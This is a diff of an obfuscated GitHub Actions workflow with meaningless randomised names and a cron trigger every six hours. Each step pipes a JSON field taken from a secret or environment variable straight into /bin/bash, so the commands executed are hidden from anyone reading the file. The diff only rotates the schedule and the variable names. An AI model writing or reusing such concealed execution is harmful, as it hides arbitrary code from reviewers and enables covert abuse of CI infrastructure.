@@ -2,25 +2,22 @@ name: zgjdfbl
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '9 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zgjdfbl
         env:
-          ejj01: ${{ secrets.ejj01 }}
+          bipy26244: ${{ secrets.bipy26244 }}
         run: |
-          echo $ejj01 | jq -r .kwir0421 | /bin/bash
-          echo $mimy73 | jq -r .vauw9 | /bin/bash
-          echo $thg37463 | jq -r .rhwoj953 | /bin/bash
-          echo $gcjqm4038 | jq -r .fw2206 | /bin/bash
-          echo $f79 | jq -r .tsqb36455 | /bin/bash
-          echo $ungh68596 | jq -r .p729 | /bin/bash
-          echo $mdmg46176 | jq -r .im54 | /bin/bash
-          echo $ttqa52 | jq -r .uhsbr91 | /bin/bash
-          echo $wbbii5 | jq -r .igsd745 | /bin/bash
-          echo $r22 | jq -r .aeeb6679 | /bin/bash
-          echo $pqjch39 | jq -r .rlxb53 | /bin/bash
+          echo $bipy26244 | jq -r .hxca872 | /bin/bash
+          echo $cmxql76 | jq -r .ta4994 | /bin/bash
+          echo $ebklp1 | jq -r .llpra1 | /bin/bash
+          echo $rm99 | jq -r .dq353 | /bin/bash
+          echo $sbn07 | jq -r .u670 | /bin/bash
+          echo $yxv61238 | jq -r .bkzb5167 | /bin/bash
 
